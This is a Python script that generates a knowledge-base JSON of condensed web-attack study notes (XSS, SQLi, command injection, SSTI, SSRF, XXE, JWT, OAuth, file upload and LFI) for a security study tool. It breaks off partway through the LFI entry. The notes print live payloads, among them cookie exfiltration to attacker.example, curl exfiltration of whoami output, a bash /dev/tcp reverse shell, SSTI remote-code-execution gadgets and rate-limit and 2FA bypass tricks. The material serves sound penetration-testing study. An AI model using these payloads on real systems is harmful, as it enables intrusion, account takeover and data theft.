#!/usr/bin/env python3
"""build-kb-attacks.py — generate the Reconner knowledge-base SUMMARY JSON that
the Wizard popup's dropdown browser shows the user.

This is the DISPLAY base only. The full base that grounds wizard-ai
(cwes_knowledge_base.json) is NOT touched by this script.

Structure produced (consumed by KnowledgeBase(summary=True)):
  modules[]  -> one per ATTACK TYPE (first dropdown)
    sections[] -> the five fixed sections (second dropdown):
      overview / basic / advanced / bypass / automation

Run it to (re)write cwes_knowledge_base_summary.json next to this script and
install a copy to the runtime locations the app reads:
  ~/.wizard-ai/cwes_knowledge_base_summary.json   (preferred)
  ~/Documents/Study/CWES/cwes_knowledge_base_summary.json (fallback)
"""
import json
import os
import shutil

SECTIONS = [
    ('overview',  'Overview'),
    ('basic',     'Basic Techniques'),
    ('advanced',  'Advanced Techniques'),
    ('bypass',    'Bypass'),
    ('automation', 'Automation'),
]

# (Attack title, slug, {section_key: content}) — ALL major web/app attack
# classes. Content is condensed theory (no lab walkthroughs), authored for the
# browser pane and folded into wizard-ai chat context when a section is open.
ATTACKS = [
("Cross-Site Scripting (XSS)", "xss", {
"overview": "XSS injects attacker-controlled JavaScript that runs in another user's browser in the site's origin, letting you steal cookies/tokens, perform actions as the victim, or rewrite the page. Three forms: **Reflected** (payload echoed straight back in the response), **Stored** (saved server-side then served to others — highest impact), and **DOM** (client-side JS writes attacker input into a sink like innerHTML/eval with no server round-trip). Impact depends on context and victim privileges; stored XSS in an admin view can mean full account takeover.",
"basic": "Find a reflection, then break out of its context. HTML body: `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`. Inside an attribute: close it first — `\"><svg onload=alert(1)>`. Inside existing JS: `';alert(1)//`. Test each parameter, header (Referer, User-Agent), and stored field (profile name, comment). Confirm execution with `alert(document.domain)`. For DOM XSS, trace `location`/`document` input into sinks (innerHTML, document.write, eval, setTimeout).",
"advanced": "Weaponise beyond alert(): exfiltrate cookies (`new Image().src='//attacker.example/?c='+document.cookie`), steal localStorage tokens, keylog, or run authenticated requests with the victim's session (read CSRF tokens then POST). Blind/stored XSS in admin panels — use an out-of-band collector (XSS Hunter style) to catch fires. Chain DOM clobbering, `postMessage` abuse, or prototype pollution to reach a sink. mXSS abuses the browser re-parsing sanitised markup. Mutation/Trusted-Types-aware payloads when frameworks are involved.",
"bypass": "When sanitisation or a WAF blocks basics: **case-vary** tags/handlers (`<ScRiPt>`, `oNeRror`) against case-sensitive blacklists; **avoid `<script>`** with `<img>/<svg>/<body>` event handlers, `javascript:` URIs or `<iframe srcdoc>`; **encode** with HTML entities (`&#x61;`), URL/double-URL, or JS `\\x`/`\\u` escapes the browser decodes after the filter; **break out of context** (`\"><...>`); **obfuscate keywords** (`top['al'+'ert']`, `eval(atob('...'))`); use broken/odd markup the browser auto-corrects; **polyglots**; and **CSP bypass** via allowlisted/JSONP origins, `unsafe-inline`, or dangling-markup.",
"automation": "Map reflections with crawlers, then fuzz with payload lists (PortSwigger XSS cheat-sheet, payloadbox). **Dalfox**, **XSStrike**, and Burp Suite Pro's scanner detect reflected/DOM contexts and suggest context-aware payloads. **kxss**/**Gxss** flag which characters survive reflection. For DOM XSS, DOM Invader (Burp) traces sources to sinks live. Collect blind hits with **XSS Hunter**/interactsh. Always confirm tool findings manually — context detection is imperfect.",
}),
("SQL Injection (SQLi)", "sqli", {
"overview": "SQLi occurs when user input is concatenated into an SQL query, letting you alter its logic to read/modify data, bypass auth, or sometimes execute commands. Classes: **in-band** (union/error-based — results in the response), **blind** (boolean or time-based — infer data from app behaviour), and **out-of-band** (exfiltrate via DNS/HTTP). It remains one of the highest-impact web bugs: a single injectable parameter can dump the whole database.",
"basic": "Probe with `'`, `\"`, `)` and watch for SQL errors or behaviour changes. Confirm logic: `' OR '1'='1` vs `' AND '1'='2`. Auth bypass: `admin'-- -`. Determine column count with `ORDER BY n` until it errors, then UNION: `' UNION SELECT 1,2,3-- -`; place readable columns and pull from `information_schema.tables`/`columns`. Error-based extraction (e.g. MySQL `extractvalue`/`updatexml`, MSSQL conversion errors) leaks data in messages.",
"advanced": "Blind boolean: `' AND SUBSTRING(@@version,1,1)='8` — page differs on true/false. Time-based when there's no visible diff: `' AND SLEEP(5)-- -` / `WAITFOR DELAY` / `pg_sleep`. Out-of-band exfiltration via `LOAD_FILE`/`xp_dirtree`/UTL_HTTP to a DNS log. Escalate: read files (`LOAD_FILE`, `INTO OUTFILE` to write a webshell), stacked queries, MSSQL `xp_cmdshell`, PostgreSQL `COPY ... PROGRAM` for RCE. Pull password hashes and pivot. Second-order SQLi: payload stored then used in a later query.",
"bypass": "Past WAFs/blacklists: **inline comments** to split keywords (`UN/**/ION`, `/*!50000UNION*/`), **case variation** (`UnIoN sElEcT`), **whitespace alternatives** (`/**/`, `%09`, `%0a`, `+`, parentheses), **encoding** (URL/double-URL, hex `0x61646d696e`, `CHAR()`/concatenation when quotes are filtered — numeric contexts need no quotes), **operator equivalents** (`LIKE` for `=`, `&&`/`||`, alternative always-true conditions), and **alternative delivery** (HTTP parameter pollution, JSON/XML body). Tampering automates many of these.",
"automation": "**sqlmap** is the workhorse: `sqlmap -u URL --batch --dbs`, feed a saved request with `-r req.txt`, raise `--level`/`--risk`, use `--technique`, and chain `--tamper` scripts (space2comment, between, charencode) to defeat filters. `--os-shell`/`--file-read` for escalation. Burp scanner and **Ghauri** are alternatives. Find candidates fast by fuzzing params with quote/marker payloads and diffing responses; always verify and understand what sqlmap sends before firing at scope.",
}),
("NoSQL Injection", "nosqli", {
"overview": "NoSQL injection targets datastores like MongoDB, CouchDB or Elasticsearch where queries are built from objects/JSON rather than SQL. Untrusted input that reaches a query operator lets you bypass authentication, extract data, or trigger logic/JS execution. Two flavours: **operator injection** (smuggling query operators like `$ne`, `$gt`, `$regex`) and **syntax/JS injection** (escaping into server-side JavaScript evaluation, e.g. `$where`/`mapReduce`).",
"basic": "On login, send `{\"user\":\"admin\",\"pass\":{\"$ne\":1}}` (JSON) or `user[$ne]=1&pass[$ne]=1` (URL-encoded) to make the password check always true. `{\"$gt\":\"\"}` similarly matches non-empty values. Detect by sending operator payloads and watching for auth bypass or changed result counts. In string contexts, break out with `'`, `\"` or `\\` and watch for errors that reveal a Mongo/JS engine.",
"advanced": "Extract data blindly with `$regex`: brute-force a secret char by char — `{\"pass\":{\"$regex\":\"^a\"}}` true/false oracle. Server-side JS injection via `$where`: `'; return true; var x='` or time-based `sleep(5000)` to confirm. Abuse `$where`/`mapReduce`/`$function` for full JS execution and sometimes RCE. In aggregation pipelines, inject stages. GraphQL/ORM layers (Mongoose) can still pass operators if input isn't typed.",
"bypass": "Defeat weak filters by switching encodings between JSON body, URL-encoded bracket notation (`param[$ne]=`), and nested objects. If `$where` strings are filtered, use `$regex`/`$gt` operator-only techniques. Case and unicode tricks on operator keys; array wrapping (`param[]=`) to change type handling. When a key is stripped, try alternate operators that achieve the same oracle (`$in`, `$nin`, `$exists`).",
"automation": "**NoSQLMap** automates auth bypass and blind extraction for MongoDB. **nosqli** (CLI) and Burp extensions fuzz operator payloads. Build a custom `$regex` extraction script around a true/false oracle for blind dumps — it's often faster and more reliable than generic tools. Intercept the app's real request to learn the exact JSON shape before fuzzing operator positions.",
}),
("OS Command Injection", "cmdi", {
"overview": "Command injection happens when user input is passed into a system shell (exec, system, popen, backticks) without sanitisation, letting you run arbitrary OS commands as the web user. Impact is typically full server compromise. It can be **in-band** (output returned) or **blind** (no output — confirm via timing or out-of-band callbacks).",
"basic": "Append a command with a shell separator: `; id`, `| id`, `&& id`, `|| id`, backticks `` `id` ``, or `$(id)`. Try in any field that might feed a tool (ping, DNS lookup, file conversion, export). Look for command output in the response. URL-encode separators if needed (`%3B`, `%7C`). Newline `%0a` also separates on Unix.",
"advanced": "Blind: confirm with timing `; sleep 10` or out-of-band `; curl http://attacker.example/$(whoami)` / `nslookup $(whoami).attacker.example`. Then get a reverse shell (`bash -i >& /dev/tcp/IP/PORT 0>&1`, or `mkfifo`/python/nc variants), exfiltrate files, or pivot. Argument injection (input becomes a flag, e.g. `-o`, `--output`) can be as dangerous as full injection. Watch for injection into `Runtime.exec`/argv arrays where separators don't apply but argument smuggling does.",
"bypass": "Filtered spaces: use `${IFS}`, `<`, `{cmd,arg}`, or `$IFS$9`. Blacklisted keywords: insert quotes/backslashes (`w'h'o'am'i`, `wh\\oami`), wildcards (`/bin/c?t`), variable splicing (`a=who;b=ami;$a$b`), or base64 (`echo Y21k|base64 -d|bash`). Avoid blocked chars with `$(...)` vs backticks vs `;`/`|`/newline alternatives. On Windows use `^` escaping, `%VAR%`, and `cmd /c`. Out-of-band exfil when output is stripped.",
"automation": "**commix** automates detection and exploitation across separators/techniques and can spawn shells. Fuzz parameters with separator+marker/sleep payloads and diff timing for blind cases. Use **interactsh**/Burp Collaborator to catch blind out-of-band hits. Nuclei has command-injection templates for known apps. Always confirm manually and keep payloads in authorised scope.",
}),
("Code Injection", "code-injection", {
"overview": "Code injection is when input reaches a language interpreter (PHP `eval`, Python `eval`/`exec`/`pickle`, Ruby, Node `Function`/`vm`, server-side JS) and is executed as code in the app's runtime — distinct from OS command injection, though it usually leads to it. Common in template/expression evaluators, deserialisers, and 'calculator'/formula features.",
"basic": "Send a small expression and look for evaluation: `7*7` returning `49`, or language-specific markers. PHP: `system('id')` via `eval`-backed params; `assert`, `preg_replace` with `/e`. Python: `__import__('os').system('id')`. Node: `process.mainModule.require('child_process').execSync('id')`. Confirm with arithmetic or a unique string before escalating.",
"advanced": "Pivot to OS commands and a reverse shell. In sandboxes, traverse the object graph to reach dangerous primitives (Python `().__class__.__bases__[0].__subclasses__()` to find `os`/`subprocess`). Abuse deserialisation gadgets (pickle `__reduce__`, PHP magic methods) for code exec. Read environment/secrets, write a webshell, or establish persistence. Distinguish expression-language injection (often template engines) from raw `eval` — they need different escapes.",
"bypass": "Filtered functions/keywords: build names dynamically (`globals()['__bui'+'ltins__']`), use getattr/`__getattribute__`, string concatenation, hex/unicode escapes, or base64-decode-then-exec. Avoid blocked chars with alternative call syntaxes. In sandboxes, find an unfiltered class in the subclass list. Use comment/whitespace tricks the parser tolerates.",
"automation": "Template/EL cases: **tplmap** detects and exploits code/template injection across engines. For ad-hoc eval sinks, fuzz with arithmetic and language-specific probes and diff responses. **ysoserial**/**ysoserial.net** generate deserialisation gadget chains. Burp scanner flags some eval sinks. Reproduce manually to confirm the interpreter and craft the right escape.",
}),
("Server-Side Template Injection (SSTI)", "ssti", {
"overview": "SSTI arises when user input is embedded into a server-side template that is then rendered (Jinja2, Twig, Freemarker, Velocity, ERB, Handlebars, etc.), letting you inject template syntax that the engine evaluates. Depending on the engine it ranges from information disclosure to full RCE. It is frequently found in email/notification templates, error pages, and any 'customise this message' feature.",
"basic": "Detect with a polyglot like `${{<%[%'\"}}%\\`. Then confirm arithmetic in template syntax: `{{7*7}}` (Jinja2/Twig → 49) vs `${7*7}` (Freemarker/JSP) vs `<%= 7*7 %>` (ERB). `{{7*'7'}}` distinguishes Jinja2 (7777777) from Twig (49). Identifying the engine is the key step — payloads differ entirely between engines.",
"advanced": "Escalate to RCE per engine. Jinja2: `{{ ''.__class__.__mro__[1].__subclasses__() }}` to find a subprocess/Popen class, or `{{ cycler.__init__.__globals__.os.popen('id').read() }}`, or via `lipsum`/`request` globals. Twig: `{{['id']|filter('system')}}`. Freemarker: `<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}`. Read secrets/config, then a reverse shell. Sandbox escapes traverse the object graph to reach unguarded callables.",
"bypass": "When chars/keywords are blacklisted: reach objects via attribute access (`['__cl'+'ass__']`), string concatenation, or alternative template syntax/filters. Escape sandboxes by walking the object graph (Python `__class__`→`__mro__`→`__subclasses__`). Use the engine's own filters/functions to call dangerous methods indirectly. Hex/unicode/`attr()` tricks to dodge dotted-attribute filters.",
"automation": "**tplmap** and **SSTImap** automate engine detection and exploitation (including blind/time-based and RCE) across many engines. Burp scanner detects some SSTI. Start with the detection polyglot, let the tool fingerprint the engine, then verify the RCE primitive by hand — engine-specific gadgets change across versions and sandboxes.",
}),
("Server-Side Request Forgery (SSRF)", "ssrf", {
"overview": "SSRF tricks the server into making HTTP (or other-scheme) requests to a destination you choose, so you can reach internal services, cloud metadata, or the loopback interface that aren't exposed externally. Impact: read internal apps, hit cloud metadata for credentials, port-scan the internal network, or pivot to RCE on internal services. Found in URL fetchers, webhooks, PDF/image generators, and 'import from URL' features.",
"basic": "Point a URL parameter at your own collector to confirm the server fetches it. Then target internal hosts: `http://127.0.0.1/`, `http://localhost:8080/`, internal IP ranges, and cloud metadata `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/` (GCP). Note **blind** SSRF (no response body returned) vs **full-response** SSRF — for blind, infer via timing, status, or out-of-band callbacks.",
"advanced": "Read cloud credentials (`/latest/meta-data/iam/security-credentials/`). Port-scan internals by diffing response time/status. Reach non-HTTP services with alternate schemes: `gopher://` to forge arbitrary TCP (Redis/SMTP/HTTP POST payloads → RCE), `dict://`, `file:///etc/passwd`, `ftp://`. Chain SSRF with a redirect on an allowed host, or with an internal admin endpoint, to escalate. Blind SSRF + a known internal CVE can be full compromise.",
"bypass": "Defeat allowlist/blocklist filters by representing the host differently: `127.1`, `0.0.0.0`, `[::1]`, decimal (`2130706433`), hex (`0x7f000001`) or octal IPs; `http://allowed@attacker.example`/`#`/added ports to confuse URL parsing; open redirects on an allowed host; **DNS rebinding** to pass a one-time check then resolve to internal; and scheme switches (`gopher`,`file`,`dict`). Metadata endpoints often have equivalent alternate encodings.",
"automation": "**SSRFmap** (feed a request + the injectable param), **Gopherus** (craft gopher payloads for Redis/MySQL/FastCGI/SMTP), and **interactsh**/Burp Collaborator to catch blind callbacks. Nuclei has SSRF and metadata templates. Fuzz URL params with internal-target and encoding wordlists; for blind, automate an out-of-band oracle. Confirm reachability and stay within authorised scope (cloud metadata reads can expose real creds).",
}),
("XML External Entity (XXE)", "xxe", {
"overview": "XXE abuses XML parsers that resolve external entities, letting you read local files, perform SSRF, or cause DoS by injecting a DOCTYPE with entity definitions. Anywhere XML is accepted (SOAP, SAML, SVG, DOCX/XLSX, RSS, config uploads, REST that accepts `application/xml`) is a candidate. Modern parsers often disable it, but legacy stacks and misconfigurations remain common.",
"basic": "Define and reference an external entity to read a file: `<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]>` then use `&x;` inside an element whose value is reflected. SSRF variant: `SYSTEM \"http://169.254.169.254/...\"`. First test whether entities resolve at all with a harmless local entity, and whether the value is reflected back.",
"advanced": "**Blind/OOB XXE** when nothing is reflected: host an external DTD that uses a parameter entity to exfiltrate a file over HTTP/FTP (`<!ENTITY % d SYSTEM \"http://attacker.example/?%file;\">`). **Error-based** exfil forces the file content into a parse error message. **XInclude** when you can't control the DOCTYPE (`<xi:include href=...>`). XXE inside uploaded SVG/Office files. Billion-laughs/quadratic-blowup for DoS (use cautiously).",
"bypass": "If `DOCTYPE` is blocked, try XInclude or UTF-16/UTF-7 re-encoding of the payload to slip past keyword filters. Use parameter entities (`%`) when general entities are filtered. PHP `expect://`/`php://filter` wrappers to base64-encode binary files for clean exfil. Nested/external DTDs to move the dangerous syntax off the request body. Try alternate content types the endpoint also accepts.",
"automation": "**XXEinjector** automates file read and OOB exfiltration (including via external DTDs). **Burp scanner** and the **collaborator** detect blind XXE well. Generate malicious DOCX/SVG/XLSX with helper scripts and upload them. Stand up an attacker-controlled DTD server and an interactsh listener for OOB. Verify the parser actually resolves entities before investing in blind exfil chains.",
}),
("Cross-Site Request Forgery (CSRF)", "csrf", {
"overview": "CSRF forces a logged-in victim's browser to send a state-changing request to a site where they're authenticated, using their ambient cookies — without the attacker reading the response. Impact: change email/password, transfer funds, alter settings — anything a request can do. Requires a predictable request and cookie-based auth that the browser attaches automatically.",
"basic": "Identify a state-changing request with no unpredictable token. Build an auto-submitting HTML form (for POST) or an `<img>`/link (for GET) hosted on your page; when the victim visits, the request fires with their cookies. Confirm the action succeeded. Check whether the app relies only on cookies and whether any anti-CSRF token is actually validated.",
"advanced": "Chain CSRF with other bugs: CSRF a self-XSS into a stored XSS; CSRF an account email change then password reset → takeover. Login CSRF (force victim into attacker's session to capture their activity). JSON endpoints: try `text/plain` or form-encoded bodies, or a Flash/`<form>` trick, if CORS/preflight is lax. Multi-step flows can sometimes be forged step by step.",
"bypass": "Token defences fail when: the token isn't tied to the session (use your own valid token), validation is skipped if the param is absent/empty, only the request *method* changes (switch POST→GET), the token is reflected in a predictable place, or it's checked only for `Content-Type: application/x-www-form-urlencoded` (send a different type). Weak `SameSite` (Lax allows top-level GET navigations; method/redirect tricks). Referer-only checks bypassed by suppressing/forging Referer.",
"automation": "Burp Suite's **CSRF PoC generator** builds the auto-submit form from any request. Burp scanner flags missing/again-usable tokens. Test SameSite behaviour across browsers. For JSON/CORS interplay, combine with a CORS check. Mostly a manual, logic-driven bug — automation helps generate PoCs and spot token reuse, not judge exploitability.",
}),
("IDOR / Broken Object-Level Authorization", "idor", {
"overview": "IDOR (a.k.a. BOLA, OWASP API #1) is accessing objects you shouldn't by manipulating an identifier the app trusts — `/account/123` → `124`, `?file=invoice_5.pdf`, a UUID, or an object id in a JSON body — when the server fails to check ownership. Impact ranges from reading others' data to modifying/deleting it. The single most common high-impact API bug.",
"basic": "Find requests carrying object identifiers (path, query, body, headers, cookies). Change the id to another value (increment numeric ids, swap a second account's id) and see if you get another user's object. Test every verb: read (GET), update (PUT/PATCH), delete. Use two accounts — capture account A's request, replay it as account B (or unauthenticated).",
"advanced": "Hunt non-obvious identifiers: hashed/encoded ids (decode base64/hex, predict), UUIDs leaked elsewhere (in lists, exports, emails), composite keys, and ids in nested JSON or GraphQL node ids. Mass-assignment-style IDOR where you add an `id`/`owner` field. Blind IDOR (no body returned but action happens — confirm via side effects). Function-level + object-level combined (BFLA). Export/report/print endpoints often skip the ownership check the main view enforces.",
"bypass": "Where direct id swaps are blocked: try alternate representations (`123` vs `0123` vs `123.0`), wrap in arrays (`id[]=`), parameter pollution (`id=mine&id=victim`), different content types, or path vs query duplication. Supply the victim id in a header the app trusts (`X-User-Id`). Use a leaked id from a less-protected endpoint. Downgrade to an older/api-versioned route that lacks the check.",
"automation": "Burp **Autorize** / **AuthMatrix** replay every request as a second (lower-priv) user and flag those that still succeed — the fastest IDOR finder. **Arjun**/param miners surface hidden id params. Intruder/ffuf to enumerate numeric id ranges and diff response sizes. Scripts to decode/predict encoded ids. Always verify with two real accounts to avoid false positives.",
}),
("Broken Access Control & Privilege Escalation", "access-control", {
"overview": "Broken access control is the failure to enforce what an authenticated user is allowed to do — covering vertical escalation (user→admin), horizontal escalation (user→another user, see IDOR), and function-level gaps (BFLA: calling admin functions directly). OWASP's #1 category. Often the controls exist in the UI but not on the server, or only on some routes/verbs.",
"basic": "Enumerate privileged functionality (admin panels, user-management, settings) and try to reach it as a low-priv or unauthenticated user. Force-browse to admin URLs you found in JS/sitemaps. Remove or downgrade your role/token and replay privileged requests. Change a `role`/`isAdmin`/`userType` field. Test that 'hidden' menu items aren't simply UI-gated.",
"advanced": "Tamper role at registration/profile-update (mass assignment of `roleid`). Abuse multi-step flows that check authz only on step 1. Method/route mismatch: the GET is protected but the PUT isn't, or `/api/v2/` lacks `/api/v1/`'s check. JWT/role claims trusted from the client. Referer/`X-Original-URL` based gateway authz bypass. Chain horizontal→vertical by taking over an admin object.",
"bypass": "Defeat path-based gateway checks with case (`/Admin`), trailing slash/dot, `..;/`, double-encoding, `X-Original-URL`/`X-Rewrite-URL` overrides, or HTTP verb tampering (HEAD, arbitrary methods). Add trusted headers (`X-Forwarded-For: 127.0.0.1`) for 'internal only' endpoints. Swap to an api version/host that skips the control. Replay a privileged token on a route that only checks authentication, not authorization.",
"automation": "Burp **Autorize**/**AuthMatrix** systematically replay the full request set across roles and unauth, flagging access-control gaps. **ffuf**/dirsearch to force-browse admin routes. Param miners for role fields. Nuclei templates for known admin-exposure issues. Build a role matrix (who can do what) and test every cell — automation drives coverage, you judge intent.",
}),
("Authentication Bypass", "auth-bypass", {
"overview": "Authentication bypass is gaining access without valid credentials by attacking the login/auth logic itself — SQLi in the login query, response/flow tampering, default or guessable credentials, broken 'remember me'/SSO, or logic flaws in multi-step auth. The reward is a foothold or full takeover, so it's a top-priority target.",
"basic": "Try default/common creds (admin:admin, app-specific defaults) and weak passwords. SQLi auth bypass: `admin'-- -`, `' OR 1=1-- -`. Check whether the server actually verifies the password or trusts a client value. Look for verbose errors that distinguish 'user not found' from 'wrong password' (username enumeration). Test password reset and 'magic link' flows for direct access.",
"advanced": "Response tampering: flip a `{\"success\":false}`/`200 vs 302` to log in (especially in thick/SPA clients). Skip steps in multi-step or 2FA flows (go straight to the post-2FA endpoint). Forced browsing past the login. Abuse SSO/OAuth/SAML assertion handling (see those sections). Predictable session/reset tokens. Type juggling (`==`) and magic-hash logins in PHP. Null-byte/array tricks on the password param.",
"bypass": "When direct bypass is blocked: array/JSON type confusion (`password[]=`), unicode/case in usernames to hit a different record, header trust (`X-Forwarded-For`/`X-Real-IP` for IP allowlists), and reset-token leakage via Host header poisoning. 2FA bypass: reuse/replay codes, brute short OTPs without rate-limit, response manipulation, or sibling endpoints that skip the second factor. Session-fixation to inherit an authenticated session.",
"automation": "**Hydra**/**Medusa**/**Patator** for credential attacks (see Brute Forcing). Burp Intruder to fuzz login params and diff responses. Nuclei has default-credential and auth-bypass templates for known products. Username enumeration via timing/error diffs can be scripted. Keep within scope and rate limits — auth endpoints are sensitive and monitored.",
}),
("Brute Forcing & Credential Attacks", "brute-force", {
"overview": "Brute forcing guesses credentials, tokens, or hidden values by trying many candidates. Variants: classic password brute force, **password spraying** (few common passwords across many users to dodge lockout), **credential stuffing** (breached user:pass pairs), and brute forcing OTPs, reset tokens, API keys, or directory/file names. Effectiveness hinges on weak passwords, missing rate limits, and username enumeration.",
"basic": "Enumerate valid usernames first (registration/login/reset error and timing differences). Then attack with a targeted wordlist. Identify the exact request (params, CSRF token, success/failure indicator). Use a small high-probability password list and watch for the success signal (status, length, redirect, cookie). Respect lockout thresholds — note them and adapt.",
"advanced": "Password spraying to avoid lockout: one password across all users per round, wait out the window. Credential stuffing with breach combos. Brute short numeric OTPs/2FA codes when there's no submission cap. Token entropy analysis — if reset/session/API tokens are short or time-seeded, predict rather than brute. Distribute attempts across IPs when rate-limiting is per-IP.",
"bypass": "Rate limits keyed on a spoofable header → rotate `X-Forwarded-For`/`X-Real-IP` per request; otherwise distribute across proxies or stay under the threshold. Account lockout → switch to spraying. CAPTCHA → reuse a non-invalidated token, find sibling endpoints without it, or solve weak ones with OCR/AI. 2FA/OTP → brute when no submission limit, or manipulate the multi-step flow/response to skip verification.",
"automation": "**Hydra**, **Medusa**, **Patator**, **ffuf**, and Burp **Intruder** drive the requests; **CeWL**/**Mentalist**/rules build targeted lists; **wfuzz** for tokens/paths. Use response-diffing (length/status/words) to find the hit. Configure threads/delays to match lockout and stay in scope. For content discovery (files/dirs), gobuster/feroxbuster/ffuf with SecLists.",
}),
("Session Management Flaws", "session", {
"overview": "Session flaws let an attacker obtain, fix, or extend another user's session. Causes: predictable/low-entropy session ids, tokens exposed in URLs/logs, missing `HttpOnly`/`Secure`/`SameSite` flags, no rotation on login (fixation), no invalidation on logout/password-change, and overly long lifetimes. Stealing a session = acting as that user with no credentials.",
"basic": "Inspect the session cookie: entropy, flags (`HttpOnly`, `Secure`, `SameSite`), scope, and lifetime. Check whether the id changes on login (it should). Test logout: is the old token still valid afterward? Is it invalidated on password change? Look for session ids leaked in URLs, Referer, or error pages.",
"advanced": "**Session fixation**: set a known id before login; if it isn't rotated, you ride the victim's authenticated session. **Token prediction** when ids are sequential/timestamp-based. Steal tokens via XSS (if not HttpOnly), SSRF, or logs. Concurrent-session and 'remember me' token weaknesses. JWT-specific issues live in their own section. Cross-subdomain cookie scoping abuse.",
"bypass": "Weak `SameSite` enables CSRF-style cross-site use (Lax permits top-level GET). If logout only clears the cookie client-side, the captured token still works server-side — replay it. Domain-scoped cookies (`.example.com`) reachable from a vulnerable subdomain. Token in URL → leak via Referer to attacker page. Downgrade to HTTP to strip `Secure`.",
"automation": "Burp **Sequencer** measures session-token randomness. Burp scanner flags cookie-flag and fixation issues. Scripts to replay an old token post-logout and to test rotation on login. Decode/inspect tokens for structure (timestamps, counters). Mostly manual analysis — tooling quantifies entropy and automates replay checks.",
}),
("JWT Attacks", "jwt", {
"overview": "JSON Web Tokens carry signed claims (header.payload.signature, base64url). Attacks exploit weak or mis-validated signatures and trusting claims you can edit: `alg:none`, algorithm confusion (RS256→HS256), weak HMAC secrets, key-injection (`jwk`/`kid`), and unbounded/expired tokens. A forged token usually means full impersonation or privilege escalation.",
"basic": "Decode the token (it's just base64url) and read the claims. Try editing a claim (`role:admin`, `user:other`) and see if the server checks the signature at all. Test **`alg:none`**: set header alg to none/None/NONE, drop the signature, see if it's accepted. Check expiry enforcement — replay an old token.",
"advanced": "**Algorithm confusion**: if the server verifies RS256 with a public key but you switch `alg` to HS256, you can sign with the *public key as the HMAC secret* (which you know) to forge tokens. **Weak HMAC secret**: crack HS256 offline with a wordlist. **`kid` injection**: path traversal/SQLi via the `kid` header to point verification at a key you control; **`jwk`/`jku`** header to supply your own key. Mix expired/`nbf` handling gaps.",
"bypass": "Forge with the chosen weakness: `alg:none` (no signature), HS256-with-public-key, or a cracked secret. Manipulate `kid` to load `/dev/null` (empty key → empty signature) or a file you control. Point `jku`/`x5u` to your hosted key set if the server fetches it. Strip/alter `exp`. Swap to a JWT-less session path if one exists.",
"automation": "**jwt_tool** (`-M`, `-X`) automates alg:none, key-confusion, kid/jku injection, and signature checks. **hashcat -m 16500** cracks HS256 secrets against a wordlist. Burp **JWT Editor** extension forges and re-signs tokens in-flow. jwt.io to inspect. Verify each finding by actually using the forged token against a protected endpoint.",
}),
("OAuth, SSO & SAML Attacks", "oauth-sso", {
"overview": "Federated auth (OAuth 2.0, OpenID Connect, SAML) delegates login to an identity provider. Flaws live in redirect handling, state/nonce, token/assertion validation, and scope — leading to account takeover or impersonation. Complex multi-party flows mean small validation gaps (an unchecked `redirect_uri`, an unsigned SAML assertion) have large impact.",
"basic": "Map the flow (authorization code vs implicit, the params: `client_id`, `redirect_uri`, `state`, `scope`, `response_type`). Tamper `redirect_uri` to an attacker domain/subpath to steal the code/token. Check whether `state` exists and is validated (CSRF on the callback). Replay an authorization code; check single-use. For SAML, capture the assertion and inspect signing.",
"advanced": "**redirect_uri** loosely matched (path traversal, open-redirect chains, `localhost`, subdomain) → leak code/token. **State** missing → login CSRF / account linking abuse. **Token substitution**: use a token issued for app A on app B (audience not checked). **SAML**: unsigned or signature-stripping (XSW — XML Signature Wrapping) to forge assertions; comment/`NameID` injection. OIDC `id_token` validation gaps (alg, iss, aud, nonce). Pre-account-takeover via email-not-verified linking.",
"bypass": "Defeat redirect allowlists with the SSRF-style URL tricks (`@`, `#`, subpath, subdomain, encoded). XSW variants to bypass SAML signature validation. Swap `response_type`/`response_mode` to leak tokens in the fragment. Downgrade to implicit flow if still supported. Reuse a leaked `code`/`id_token`. Inject into `login_hint`/`prompt` for unexpected flows.",
"automation": "Burp's **OAuth/SSO** workflows and the **SAML Raider** extension (sign/strip/XSW assertions) are the main tools. **EsPReSSO** for SSO request analysis. Script `redirect_uri` fuzzing and state-omission tests. Mostly careful manual analysis of a multi-step, signed flow — tools assist with assertion tampering and PoC generation.",
}),
("File Upload Vulnerabilities", "file-upload", {
"overview": "Insecure upload handling lets you place dangerous files on the server — most critically a server-side script in a web-reachable directory for RCE, but also XSS (HTML/SVG), XXE (SVG/Office), SSRF (via parsers), path traversal (filename), or DoS. Impact depends on what's accepted and where it lands and whether it executes.",
"basic": "Upload a benign file, find where it's stored and whether you can reach it. Then upload a webshell (`shell.php`) and request it. Test what the server checks: extension allowlist/blocklist, `Content-Type`, magic bytes, file size. Note whether files are renamed/randomised and whether the upload dir is executable.",
"advanced": "Get code execution: drop `.php`/`.jsp`/`.aspx` in an executable path; if renamed, abuse a path-traversal filename (`../../shell.php`) to control location. Polyglots (valid image + embedded script) to pass content checks. `.htaccess`/`web.config` upload to make a benign extension execute. SVG/XML upload → stored XSS or XXE. Zip-slip on extraction. ImageTragick/Ghostscript via image processors. Overwrite critical files.",
"bypass": "Extension filters: double extensions (`shell.php.jpg`, `shell.jpg.php`), case (`.pHp`), alternates (`.php5`, `.phtml`, `.phar`), null byte (`shell.php%00.jpg` on legacy), trailing dot/space/`::$DATA` (Windows). Content-Type: spoof `image/png` while body is script. Magic-byte checks: prepend `GIF89a;` or real image headers before the payload. Bypass image re-encoding with metadata-embedded payloads only when the processor copies them.",
"automation": "**Burp Upload Scanner** extension and **fuzzdb** upload wordlists automate extension/content-type permutations. Generate polyglots with helper scripts. **upload_bypass** tooling and Nuclei templates for known products. After upload, fuzz for the stored path with ffuf. Confirm execution manually — many 'successful uploads' land in non-executable storage.",
}),
("Local File Inclusion (LFI)", "lfi", {
"overview": "LFI is when user input controls a server-side file path used in an include/read, letting you read local files or — by combining with other techniques — execute code. Common in `?page=`, template/`lang` selectors, and download endpoints. Distinct from path traversal (which is read-only file access) in that the file is often *included/executed* by the language.",
"basic": "Try to read a known file: `?page=/etc/passwd` or traversal `?page=../../../../etc/passwd`. Windows: `..\\..\\windows\\win.ini`. If the app appends an extension (`.php`), you may need a wrapper or truncation. Confirm by reading a file whose contents you can recognise, then enumerate config/secret files.",
